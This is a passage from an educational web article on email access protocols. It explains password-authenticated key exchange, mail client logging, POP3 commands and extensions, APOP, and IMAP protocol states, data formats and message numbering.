Otherwise, a <a href="#dangerous-reliance-on-tls">man-in-the-middle</a> can establish
one secret with the first party and another secret with the second party,
allowing them to intercept all messages between the two parties.
One way of achieving this is by relying on third parties,
so-called <a href="https://evalapply.org/internet/#public-key-infrastructure">certification authorities</a>,
to confirm the identity and the <a href="https://evalapply.org/internet/#digital-signatures">public key</a> of a party.
Another way of achieving this is by relying on a secret that they already share.
Password-based authentication mechanisms
such as <a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a>
accomplish this by <a href="#tls-channel-bindings">binding</a> to the secure channel
after it has already been established.
<a href="https://en.wikipedia.org/wiki/Password-authenticated_key_agreement">Password-authenticated key exchange (<abbr title="Password-Authenticated Key Exchange">PAKE</abbr>) protocols</a>,
on the other hand,
accomplish this by using the password during the key exchange for mutual authentication.
You don’t want to use a key derived from the password as the shared secret
because once the password is compromised, all earlier sessions are compromised as well.
Password-authenticated key exchange protocols avoid this
by using <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">public-key cryptography</a>
to establish a secret which is unique to each session and cannot be derived from the password.
One example is the <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">Secure Remote Password (<abbr title="Secure Remote Password">SRP</abbr>) protocol</a>.
Not only does it achieve the just-mentioned property,
which is called <a href="https://en.wikipedia.org/wiki/Forward_secrecy">forward secrecy</a>,
it’s also resistant to <a href="#desirable-properties-of-authentication-mechanisms">user impersonation after server compromise</a>:
The server never learns the necessary information to impersonate its users.
<abbr title="Transport Layer Security">TLS</abbr> supports <abbr title="Secure Remote Password">SRP</abbr> as a <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security#Key_exchange_or_key_agreement">key exchange algorithm</a>
under the label <a href="https://en.wikipedia.org/wiki/TLS-SRP"><abbr title="Transport Layer Security">TLS</abbr>-<abbr title="Secure Remote Password">SRP</abbr></a>
but just like <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> it seems to be
<a href="https://crypto.stackexchange.com/questions/8245/why-is-srp-not-widely-used">rarely used</a>.
One downside of <abbr title="Secure Remote Password">SRP</abbr> is that it leaks the username to any eavesdropper during
<a href="https://datatracker.ietf.org/doc/html/rfc5054#section-2.2">its <abbr title="Transport Layer Security">TLS</abbr> handshake</a>.</p>

</details>

<h3 id="access-protocols">Access protocols</h3>

<p>Besides <a href="#standardization">proprietary protocols</a>,
most incoming mail servers allow mail clients to access the user’s mailbox
with <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a> or <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>.
If your mail client and your mail server support both protocols,
you should choose the latter as it’s much more powerful.
The main reason for including <abbr title="Post Office Protocol version 3">POP3</abbr> in this article
is that it’s much easier to use from the <a href="#command-line-interface">command-line interface</a>.</p>

<details>
  <summary id="apple-mail-logging">
Communication logging in Apple Mail
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Apple_Mail">Apple Mail</a> allows you to inspect its communication with your mail servers
by clicking on “Connection Doctor” in the “Window” menu and then on “Show Detail”.
You can also enable “Log Connection Activity” there to persist the log of its communication
in the folder <code>~/Library/Containers/com.apple.mail/Data/Library/Logs/Mail/</code>.
Since the <a href="https://en.wikipedia.org/wiki/Log_file">log files</a> include the content of all your messages,
including deleted ones and those of removed accounts,
you should enable this option only if you really need it.</p>

</details>

<details>
  <summary id="thunderbird-logging">
Communication logging in Thunderbird
</summary>

  <p>You can inspect how <a href="https://www.thunderbird.net">Thunderbird</a> interacts with your mail servers
by logging its communication with the <a href="https://wiki.mozilla.org/MailNews:Logging">following commands</a>:</p>

  

  <p>Enter the above commands in your <a href="#command-line-interface">command-line interface</a>,
then open the <a href="https://en.wikipedia.org/wiki/Log_file">log file</a>
in a text editor, such as <a href="https://code.visualstudio.com/">Visual Studio Code</a>.</p>

</details>

<h4 id="post-office-protocol-version-3">Post Office Protocol Version 3 (<abbr title="Post Office Protocol version 3">POP3</abbr>)</h4>

<p>The <a href="https://en.wikipedia.org/wiki/Post_Office_Protocol">Post Office Protocol Version 3 (<abbr title="Post Office Protocol version 3">POP3</abbr>)</a>
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc1939"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1939</a>.
Similar to <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>,
<abbr title="Post Office Protocol version 3">POP3</abbr> is a <a href="https://evalapply.org/internet/#text-based-protocols">text-based</a>
<a href="https://evalapply.org/internet/#application-layer">application-layer protocol</a>,
which can be used <a href="#use-of-tls">with Implicit <abbr title="Transport Layer Security">TLS</abbr> or with Explicit <abbr title="Transport Layer Security">TLS</abbr></a>.
<abbr title="Post Office Protocol version 3">POP3</abbr> with Implicit <abbr title="Transport Layer Security">TLS</abbr> is also known as <abbr title="Post Office Protocol version 3 Secure">POP3S</abbr>.
Just like <a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a>,
<a href="#pop3-commands"><abbr title="Post Office Protocol version 3">POP3</abbr> commands</a> consist of four letters,
and an <a href="#pop3-extensions">extension mechanism</a> was introduced after the initial release of the standard.
After authenticating the user,
<abbr title="Post Office Protocol version 3">POP3</abbr> allows the client to list, retrieve, and delete messages.
<abbr title="Post Office Protocol version 3">POP3</abbr> is designed to move messages from a remote queue into a local queue.
It doesn’t support read statuses, mailbox folders, message uploads, or partial fetches.</p>

<p>The following <abbr title="Post Office Protocol version 3">POP3</abbr> tool works in the same way as the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
Most of the remarks I made earlier therefore still apply.
In particular, I advise you to use it only with accounts created for this purpose.
The tool uses <a href="https://autoconfig.thunderbird.net/v1.1/">Thunderbird’s configuration database</a>
and <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>
to resolve the server you want to connect to.
Copy the commands in bold to your <a href="#command-line-interface">command-line interface</a> by clicking on them.
The text in gray mimics what the responses from the server look like.
The actual responses will be different.
Each response starts with either <code>+OK</code> or <code>-ERR</code>.
The former indicates that your command was successful,
the latter indicates that an error occurred.
If necessary, you can always kill the current <a href="https://en.wikipedia.org/wiki/Process_(computing)">process</a>
and thereby the connection by pressing <code>^C</code> (control + c).
If you use Gmail, you have to <a href="https://support.google.com/mail/answer/7104828">enable <abbr title="Post Office Protocol version 3">POP3</abbr> access</a>
in your <a href="https://mail.google.com/mail/u/0/#settings/fwdandpop">account settings</a>
and allow access from <a href="#gmail-authentication-failure">insecure apps</a>.</p>



<details>
  <summary id="pop3-commands">
<abbr title="Post Office Protocol version 3">POP3</abbr> commands
</summary>

  <p>All commands are case-insensitive and must be terminated with <a href="#newline-characters"><abbr title="Carriage Return (first newline character)">CR</abbr>+<abbr title="Line Feed (second newline character)">LF</abbr></a>.
Responses spanning several lines are terminated by a period on a line of its own.
If a line starts with a period, an <a href="#message-termination">additional period</a> is prepended to the line.
After user authentication, the server enumerates all messages in the inbox sorted by their date,
where 1 is assigned to the newest message.
All message numbers are expressed in the <a href="https://en.wikipedia.org/wiki/Decimal">decimal system</a>.
The mapping between numbers and messages is valid only for the duration of the session.
To ensure that the numbers remain valid and that the messages remain available for the duration of the session,
the server <a href="https://en.wikipedia.org/wiki/Record_locking">locks</a> the mailbox.
If the server fails to acquire the lock because the same mailbox is being accessed simultaneously,
it responds with <code>-ERR</code> to the last authentication command.
As long as the server can guarantee consistency for each client, it can allow simultaneous access.
All sizes are specified in <a href="https://en.wikipedia.org/wiki/Octet_(computing)">bytes</a>.
<abbr title="Post Office Protocol version 3">POP3</abbr> servers must support the following commands:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Command</th>
          <th>Argument</th>
          <th>Response</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-13"><code>USER</code></a></td>
          <td>Username</td>
          <td>–</td>
          <td>Indicate the user whose messages shall be retrieved.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-14"><code>PASS</code></a></td>
          <td>Password</td>
          <td>– </td>
          <td>Transmit the password to authenticate the user.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-6"><code>STAT</code></a></td>
          <td>–</td>
          <td>Count Size</td>
          <td>Return the count and size of all messages.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-6"><code>LIST</code></a></td>
          <td>[Number]</td>
          <td>Number Size</td>
          <td>List the size of all messages [or of the specified one].</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-8"><code>RETR</code></a></td>
          <td>Number</td>
          <td>Message</td>
          <td>Retrieve the message with the given number.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-8"><code>DELE</code></a></td>
          <td>Number</td>
          <td>–</td>
          <td>Mark the message with the given number as deleted.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-9"><code>RSET</code></a></td>
          <td>–</td>
          <td>–</td>
          <td>Unmark all messages that were marked as deleted.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-9"><code>NOOP</code></a></td>
          <td>–</td>
          <td>–</td>
          <td><a href="https://en.wikipedia.org/wiki/NOP_(code)#NOP_protocol_commands">Do nothing</a> besides <a href="https://en.wikipedia.org/wiki/Keepalive">keeping the connection alive</a>.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-10"><code>QUIT</code></a></td>
          <td>–</td>
          <td>–</td>
          <td>Delete the marked messages and close the connection.</td>
        </tr>
      </tbody>
    </table>

    <figcaption>
The mandatory commands of <abbr title="Post Office Protocol version 3">POP3</abbr>.
(The <code>USER</code> and <code>PASS</code> commands are strictly speaking optional.)
</figcaption>
  </figure>

</details>

<details>
  <summary id="pop3-extensions">
<abbr title="Post Office Protocol version 3">POP3</abbr> extensions
</summary>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc2449"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2449</a> defines an extension mechanism for <abbr title="Post Office Protocol version 3">POP3</abbr>.
It introduces the <a href="https://datatracker.ietf.org/doc/html/rfc2449#section-5"><code>CAPA</code> command</a>,
to which the server responds with the supported capabilities.
If a server doesn’t recognize an optional command, such as <code>CAPA</code>,
it responds with <code>-ERR</code>.
Each line in the response to the <code>CAPA</code> command indicates a command that the client can use
or a behavior which the client should know about:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Command</th>
          <th>Argument</th>
          <th>Response</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2449#section-5"><code>CAPA</code></a></td>
          <td>–</td>
          <td>Capabilities</td>
          <td>List the supported capabilities.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2595#section-4"><code>STLS</code></a></td>
          <td>–</td>
          <td>–</td>
          <td>Upgrade the connection from <abbr title="Transmission Control Protocol">TCP</abbr> to <abbr title="Transport Layer Security">TLS</abbr> just like <a href="#starttls-extension"><code>STARTTLS</code></a>.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#section-7"><code>TOP</code></a></td>
          <td>Number X</td>
          <td>Message</td>
          <td>Return the header and the top X body lines of the specified message.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc1939#page-12"><code>UIDL</code></a></td>
          <td>[Number]</td>
          <td>Number ID</td>
          <td>List the permanent ID of all messages [or just the specified one].</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

Some optional commands of <abbr title="Post Office Protocol version 3">POP3</abbr>.
These commands extend the <a href="#pop3-commands">basic functionality of <abbr title="Post Office Protocol version 3">POP3</abbr></a>.
Unlike the message numbering, the IDs are guaranteed to stay the same across sessions.

</figcaption>
  </figure>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Behavior</th>
          <th>Argument</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2449#section-6.6"><code>PIPELINING</code></a></td>
          <td>–</td>
          <td>Indicates that the server can handle <a href="#common-smtp-extensions">multiple commands</a> at a time.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2449#section-6.4"><code>RESP-CODES</code></a></td>
          <td>–</td>
          <td>Indicates that the server supports <a href="https://datatracker.ietf.org/doc/html/rfc2449#section-8">extended response codes</a> in square brackets.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc3206"><code>AUTH-RESP-CODE</code></a></td>
          <td>–</td>
          <td>Indicates that the server tells the client why an authentication attempt failed.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2449#section-6.9"><code>IMPLEMENTATION</code></a></td>
          <td>Name</td>
          <td>Indicates the name of the server’s <abbr title="Post Office Protocol version 3">POP3</abbr> implementation for troubleshooting.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2449#section-6.3"><code>SASL</code></a></td>
          <td>Mechanisms</td>
          <td>Indicates the <a href="#user-authentication"><abbr title="Simple Authentication and Security Layer">SASL</abbr> mechanisms</a> which can be used with the <a href="https://datatracker.ietf.org/doc/html/rfc1734"><code>AUTH</code> command</a>.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2449#section-6.5"><code>LOGIN-DELAY</code></a></td>
          <td>Seconds</td>
          <td>Indicates how many seconds the client has to wait before connecting again.</td>
        </tr>
        <tr>
          <td><a href="https://datatracker.ietf.org/doc/html/rfc2449#section-6.7"><code>EXPIRE</code></a></td>
          <td>Days</td>
          <td>Indicates after how many days the server deletes (retrieved) messages.</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

The server can indicate additional behavior in its response to the <code>CAPA</code> command.
<code>LOGIN-DELAY</code> and <code>EXPIRE</code> allow the server to conserve its resources.

</figcaption>
  </figure>

  <figure>
    
    <figcaption>

Just like <code>STARTTLS</code>, <code>STLS</code> is advertised only in <abbr title="Transmission Control Protocol">TCP</abbr> connections.
<a href="https://mail.google.com/">Gmail</a> doesn’t support <abbr title="Post Office Protocol version 3">POP3</abbr> with <a href="#use-of-tls">Explicit <abbr title="Transport Layer Security">TLS</abbr></a>
but <a href="https://www.gandi.net/en/domain/email">Gandi</a> does.

</figcaption>
  </figure>

</details>

<details>
  <summary id="apop-authentication">
<abbr title="Authenticated Post Office Protocol">APOP</abbr> authentication
</summary>

  <p>To the best of my knowledge,
<a href="https://datatracker.ietf.org/doc/html/rfc1939#page-15"><abbr title="Authenticated Post Office Protocol">APOP</abbr></a> stands for Authenticated Post Office Protocol.
It’s a <a href="#challenge-response-authentication-mechanism">challenge-response authentication mechanism</a> similar to
<a href="#user-authentication"><code>CRAM-MD5</code></a> with the same <a href="#desirable-properties-of-authentication-mechanisms">properties</a>.
Even though <code>APOP</code> is an <a href="https://datatracker.ietf.org/doc/html/rfc1939#section-7">optional command</a>,
it’s not advertised in the response to the <a href="#pop3-extensions"><code>CAPA</code> command</a>
because a <abbr title="Post Office Protocol version 3">POP3</abbr> server already indicates support for the <code>APOP</code> command
by including the challenge in its initial greeting.
The <code>Challenge</code> is of the form <code>&lt;Nonce@Host&gt;</code>.
The <code>Response</code> is the <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal encoding</a>
of <code>md5(Challenge + Password)</code>, where <a href="#secure-hash-algorithms"><abbr title="Message Digest version 5">MD5</abbr></a>
is a <a href="#cryptographic-hash-functions">cryptographic hash function</a>.
You find an example session <a href="https://datatracker.ietf.org/doc/html/rfc1939#section-10">in <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1939</a>.</p>

</details>

<h4 id="internet-message-access-protocol">Internet Message Access Protocol (<abbr title="Internet Message Access Protocol">IMAP</abbr>)</h4>

<p>The <a href="https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol">Internet Message Access Protocol (<abbr title="Internet Message Access Protocol">IMAP</abbr>)</a>
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3501"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3501</a>.
<abbr title="Internet Message Access Protocol">IMAP</abbr> works similar to <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>
and <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a>,
it just has many more commands and options.
An <abbr title="Internet Message Access Protocol">IMAP</abbr> mailbox acts as a remote drive for messages instead of files,
where the drive is being shared among several clients.
<abbr title="Internet Message Access Protocol">IMAP</abbr> allows users to create, delete, and rename folders,
to upload and move messages between them,
to mark messages as read or as flagged,
to search the mailbox remotely,
and to download messages without their attachments.</p>

<p>The following <abbr title="Internet Message Access Protocol">IMAP</abbr> tool works just like the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>
and <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a> tools above.
As you might mess up your mailbox or delete messages you still wanted by accident,
you should run the <a href="#imap-commands">following commands</a> on test accounts only.
If you want to use your real account, you do so at your own risk.
Certain commands have side effects, such as marking messages as read.
Make sure you fully understand a command before using it.
This tool also uses <a href="https://autoconfig.thunderbird.net/v1.1/">Thunderbird’s configuration database</a>
and <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>
to resolve the server you want to connect to.
Neither <abbr title="Internet Message Access Protocol">IMAP</abbr> nor the tool is self-explanatory.
You find more information in the <a href="https://en.wikipedia.org/wiki/Tooltip">tooltips</a> and the boxes below.</p>



<p>After the initial greeting by the server,
the client sends commands,
to which the server responds.
Since multiple commands can be in progress at the same time,
the client tags each command with a unique identifier,
such as <code>A</code>, <code>B</code>, <code>C</code>, or a dot <code>.</code>.
The server prefixes each line of its response with <code>*</code>
and completes its response with a line
which starts with the tag chosen by the client.
The tag is followed by a <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-7.1">status response</a>:
<code>OK</code> for success, <code>NO</code> for failure, or <code>BAD</code> for protocol errors.
Don’t worry about reusing tags in a single session,
you can run a command repeatedly with the same tag.
If you want to fetch another message, for example,
just enter another message number and copy the generated command again.
If you use Gmail, you have to <a href="https://support.google.com/mail/answer/7126229">enable <abbr title="Internet Message Access Protocol">IMAP</abbr> access</a>
in your <a href="https://mail.google.com/mail/u/0/#settings/fwdandpop">account settings</a>
and allow access from <a href="#gmail-authentication-failure">insecure apps</a>.</p>

<details>
  <summary id="protocol-states">
Protocol states
</summary>

  <p>Most <a href="#imap-commands"><abbr title="Internet Message Access Protocol">IMAP</abbr> commands</a> can be called only in certain
<a href="https://en.wikipedia.org/wiki/State_(computer_science)">states</a>.
(The same is <a href="https://datatracker.ietf.org/doc/html/rfc1939#section-5">true for <abbr title="Post Office Protocol version 3">POP3</abbr></a>
but I didn’t deem it worth mentioning.)
Unless the connection has been <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-7.1.4">pre-authenticated</a>,
the <abbr title="Internet Message Access Protocol">IMAP</abbr> protocol starts in the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-3.1">not-authenticated state</a>.
Before the client can do anything else,
it has to issue a <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.2.3"><code>LOGIN</code></a>
or <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.2.2"><code>AUTHENTICATE</code></a> command.
(When using <a href="#use-of-tls">Explicit <abbr title="Transport Layer Security">TLS</abbr></a>,
the client can also send the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.2.1"><code>STARTTLS</code></a> request.)
While the <code>LOGIN</code> command is followed by the username and the password,
<code>AUTHENTICATE</code> can be used with any <a href="#user-authentication"><abbr title="Simple Authentication and Security Layer">SASL</abbr> mechanism</a>
which is <a href="#imap-extensions">supported by the server</a>.
If the user has been authenticated successfully,
the protocol enters the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-3.2">authenticated state</a>.
The client has to <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.1"><code>SELECT</code></a>
or <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.2"><code>EXAMINE</code></a> a folder
before it can issue commands that affect existing messages.
Once in the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-3.3">selected state</a>,
the client can <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.4"><code>SEARCH</code></a>
and <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.5"><code>FETCH</code></a> messages (among other things).
The client can issue the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.1.3"><code>LOGOUT</code></a> command in any state,
which takes the protocol to the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-3.4">logout state</a>,
in which the server closes the connection.
If you want to inspect, modify, or delete messages in a different folder,
you can <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.2"><code>CLOSE</code></a>
or <a href="https://datatracker.ietf.org/doc/html/rfc3691"><code>UNSELECT</code></a> the current folder and open another one.
The difference between these two commands is that
the former removes messages marked for deletion permanently while the latter does not.
(<code>UNSELECT</code> is an <a href="#imap-extensions">extension</a>,
which can be used only if the server supports it.)
By using the new <a href="https://datatracker.ietf.org/doc/html/rfc8437"><code>UNAUTHENTICATE</code></a> command,
which not many servers support yet,
the client can authenticate as a different user without having to re-establish the <abbr title="Transmission Control Protocol">TCP</abbr> and <abbr title="Transport Layer Security">TLS</abbr> connection.
Here is a simplified version of the <a href="https://datatracker.ietf.org/doc/html/rfc8437#section-5">official state diagram</a>:</p>

  <figure>
    <svg id="figure-internet-message-access-protocol-states" data-name="internet-message-access-protocol-states" width="274.505" height="357" viewBox="-137.252 -1.25 274.505 357" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="0" y1="249.813" x2="0" y2="313.75" marker-end="url(#arrow-pink)" stroke-dasharray="57"></line>
    <text text-anchor="end">
        <tspan x="-12" y="288.15"><tspan>LOGOUT</tspan></tspan>
    </text>
    <line x1="6" y1="209.688" x2="6" y2="145.75" marker-end="url(#arrow-pink)" stroke-dasharray="57"></line>
    <text text-anchor="start">
        <tspan x="18" y="172.15"><tspan>CLOSE</tspan></tspan><tspan x="18" y="194.15"><tspan>UNSELECT</tspan></tspan>
    </text>
    <line x1="-6" y1="144.813" x2="-6" y2="208.75" marker-end="url(#arrow-pink)" stroke-dasharray="57"></line>
    <text text-anchor="end">
        <tspan x="-18" y="172.15"><tspan>SELECT</tspan></tspan><tspan x="-18" y="194.15"><tspan>EXAMINE</tspan></tspan>
    </text>
    <line x1="6" y1="104.688" x2="6" y2="40.75" marker-end="url(#arrow-pink)" stroke-dasharray="57"></line>
    <text text-anchor="start">
        <tspan x="18" y="78.15"><tspan>UNAUTHENTICATE</tspan></tspan>
    </text>
    <line x1="-6" y1="39.813" x2="-6" y2="103.75" marker-end="url(#arrow-pink)" stroke-dasharray="57"></line>
    <text text-anchor="end">
        <tspan x="-18" y="67.15"><tspan>LOGIN</tspan></tspan><tspan x="-18" y="89.15"><tspan>  AUTHENTICATE</tspan></tspan>
    </text>
    <rect x="-77.242" y="0" width="154.484" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="25.65"><tspan>Not authenticated</tspan></tspan>
    </text>
    <rect x="-63.353" y="105" width="126.706" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="130.65"><tspan>Authenticated</tspan></tspan>
    </text>
    <rect x="-42.605" y="210" width="85.21" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="235.65"><tspan>Selected</tspan></tspan>
    </text>
    <rect x="-36.976" y="315" width="73.952" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="340.65"><tspan>Logout</tspan></tspan>
    </text>

</svg>

    <figcaption>
The protocol states and how to transition between them.
<code>LOGOUT</code> can be called in any state except the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-3.4">logout state</a>.
<code>UNAUTHENTICATE</code> can also be called in the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-3.3">selected state</a>.
</figcaption>
  </figure>

  <p>A word on terminology:
The standard and some mail clients such as Apple Mail speak of mailboxes rather than folders.
When I speak of mailboxes, I usually refer to the mail account as a whole.
Thunderbird, on the other hand, avoids the term completely.
I mostly ignore <abbr title="Internet Message Access Protocol">IMAP</abbr> folders and how to
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.3"><code>CREATE</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.4"><code>DELETE</code></a>, and
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.5"><code>RENAME</code></a> them.
The only important aspect for us is that <code>INBOX</code> is a
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-5.1">special name</a>
and always refers to the primary folder of the user.</p>

</details>

<details>
  <summary id="data-formats">
Data formats
</summary>

  <p>While <abbr title="Internet Message Access Protocol">IMAP</abbr> is also mostly a <a href="https://evalapply.org/internet/#text-based-protocols">text-based protocol</a>,
it’s more difficult to read and to write for humans than <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> and <abbr title="Post Office Protocol version 3">POP3</abbr>.
This is due to the various data formats it uses,
which are defined in <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-4">section 4 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3501</a>.
We’re interested in just three of them:</p>
  <ul>
    <li>
      <p><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-4.3"><strong>String</strong></a>:
<a href="https://en.wikipedia.org/wiki/String_(computer_science)">Strings</a>
are either unquoted, quoted, or prefixed with their length.
Prefixing the length has the advantage that the string doesn’t have to be escaped.
In particular, <a href="#message-termination">no periods have to be added</a> to transmit a message.
This technique turns <abbr title="Internet Message Access Protocol">IMAP</abbr> into a binary protocol temporarily,
making it difficult for humans.
Let’s look at an example for each string variant.</p>

      <figure>
        
        <figcaption>
<strong>Unquoted string</strong>: Since <code>INBOX</code> contains no spaces, it doesn’t have to be quoted (but it can be).
</figcaption>
      </figure>

      <figure>
        
        <figcaption>
<strong>Quoted string</strong>: Since <code>Sent Mail</code> contains a space, it has to be quoted.
Otherwise, <code>Sent Mail</code> constitutes two arguments instead of one.
</figcaption>
      </figure>

      <figure>
        
        <figcaption>

<strong>Length-prefixed string</strong>: If a string contains newline characters,
its length in bytes has to be prefixed in curly brackets.
Since each <a href="https://en.wikipedia.org/wiki/ASCII#Control_code_chart"><abbr title="American Standard Code for Information Interchange">ASCII</abbr> character</a>
is encoded in a single byte and newlines consist of two characters,
namely <a href="#newline-characters">carriage return (\r) and line feed (\n)</a>,
<code>Subject: Example\r\n\r\n</code> consists of 20 bytes.
(<abbr title="Internet Message Access Protocol">IMAP</abbr> includes an empty line after the header and the length-prefixed string is part of a list.)
The standard calls this the literal form.
When a literal string is transmitted from the client to the server,
the client has to wait for a continuation response from the server after sending the length.
Activate <code>Write</code> and <code>Append</code> in the <a href="#tool-protocol-imap">tool above</a> to see an example.

</figcaption>
      </figure>
    </li>
    <li>
      <p><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-4.4"><strong>Lists</strong></a>:
<a href="https://en.wikipedia.org/wiki/List_(abstract_data_type)">Lists</a>
are used when a variable number of items are to be transmitted.
A single space is used to separate adjacent items
and the list is enclosed by parentheses.
Lists can be nested in other lists and lists can be empty.
Let’s look at two examples:</p>

      <figure>
        
        <figcaption>
<strong>Nested list</strong>: The response contains a nested list of <a href="#message-flags">flags</a>.
</figcaption>
      </figure>

      <figure>
        
        <figcaption>
<strong>Empty list</strong>: When the message hasn’t been seen yet, the nested list is empty.
</figcaption>
      </figure>
    </li>
    <li>
      <p><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-4.5"><strong>Nil</strong></a>:
<a href="https://en.wikipedia.org/wiki/Null_pointer"><code>NIL</code></a> indicates that an item doesn’t exist.
You have to consult the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-9">formal syntax</a> to see where <code>NIL</code> is allowed.</p>
    </li>
  </ul>

</details>

<details>
  <summary id="message-numbers">
Message numbers
</summary>

  <p><a href="#pop3-extensions">Similar to <abbr title="Post Office Protocol version 3">POP3</abbr></a>,
messages in <abbr title="Internet Message Access Protocol">IMAP</abbr> can be referenced either by their position in a folder or by their unique identifier (<abbr title="Unique Identifier for an IMAP message">UID</abbr>):</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-2.3.1.2"><strong>Position</strong></a>:
If the response to the <code>SELECT</code> or <code>EXAMINE</code> command says with <code>8 EXISTS</code> that 8 messages exist,
then 1 refers to the oldest message and 8 to the newest message.
All numbers in between are guaranteed to refer to messages as well.
When a message is removed from the folder,
the position of all subsequent messages is decremented by one.
Messages are always added at the end of the list:
When a new message is added to the 8 existing ones,
it can be referenced by the number 9.</li>
